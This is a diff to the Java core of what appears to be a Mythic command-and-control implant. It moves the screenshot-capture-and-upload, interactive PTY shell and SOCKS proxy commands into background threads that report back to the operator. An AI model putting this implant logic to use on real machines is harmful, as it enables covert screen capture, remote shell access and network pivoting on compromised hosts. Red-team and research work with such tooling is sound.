@@ -174,8 +174,10 @@ public class Agent {
                 return processBackgroundTask(taskId, parameters);
             }
             
-            // Check if this command should be run as a background task
-            if (isBackgroundCommand(command)) {
+            // Check if this is a background-only command (screenshot, pty, socks)
+            // These don't execute their Task class, they go straight to background processing
+            if ("screenshot".equals(command) || "pty".equals(command) || "socks".equals(command)) {
+                Config.debugLog(config, "Command " + command + " is background-only, starting background task");
                 return startBackgroundTask(taskId, command, parameters);
             }
             
@@ -210,14 +212,6 @@ public class Agent {
                 return null;
             }
         }
-    }
-    
-    /**
-     * Check if a command should be run as a background task
-     */
-    private boolean isBackgroundCommand(String command) {
-        // Commands that require background processing
-        return "download".equals(command) || "upload".equals(command) || "socks".equals(command) || "pty".equals(command);
     }
     
     /**
@@ -317,10 +311,7 @@ public class Agent {
                 // SOCKS proxy - start background task
                 Config.debugLog(config, "Starting SOCKS background task");
                 
-                // Execute the socks task to get initial response
-                String output = taskManager.executeTask(command, parameters);
-                
-                // Create the background task
+                // Create the background task (don't execute SocksTask)
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
                 BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
                     new com.woopsie.tasks.SocksBackgroundTask(taskHolder[0], config).run();
@@ -335,16 +326,13 @@ public class Agent {
                 
                 Config.debugLog(config, "Background SOCKS task started for: " + taskId);
                 
-                // Return the initial response (not completed)
-                return commHandler.createTaskResult(taskId, output);
+                // Don't return anything - the background task will send responses
+                return null;
             } else if ("pty".equals(command)) {
                 // PTY - start background task
                 Config.debugLog(config, "Starting PTY background task");
                 
-                // Execute the pty task to get initial response
-                String output = taskManager.executeTask(command, parameters);
-                
-                // Create the background task
+                // Create the background task (don't execute PtyTask)
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
                 BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
                     new com.woopsie.tasks.PtyBackgroundTask(taskHolder[0], config).run();
@@ -359,8 +347,30 @@ public class Agent {
                 
                 Config.debugLog(config, "Background PTY task started for: " + taskId);
                 
-                // Return the initial response (not completed)
-                return commHandler.createTaskResult(taskId, output);
+                // Don't return anything - the background task will send responses
+                return null;
+            } else if ("screenshot".equals(command)) {
+                // Screenshot - start background task to capture and upload
+                Config.debugLog(config, "Starting screenshot background task");
+                
+                // Create the background task
+                final BackgroundTask[] taskHolder = new BackgroundTask[1];
+                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
+                    new com.woopsie.tasks.ScreenshotBackgroundTask(taskHolder[0], config).run();
+                });
+                taskHolder[0] = bgTask;
+                
+                // Store the background task for later processing
+                backgroundTasks.put(taskId, bgTask);
+                
+                // Start the background task thread
+                bgTask.start();
+                
+                Config.debugLog(config, "Background screenshot task started for: " + taskId);
+                
+                // Don't return anything - the background task will send the download info
+                // Return null so this task response doesn't get sent to Mythic
+                return null;
             }
             
             return commHandler.createTaskError(taskId, "Unknown background command: " + command);
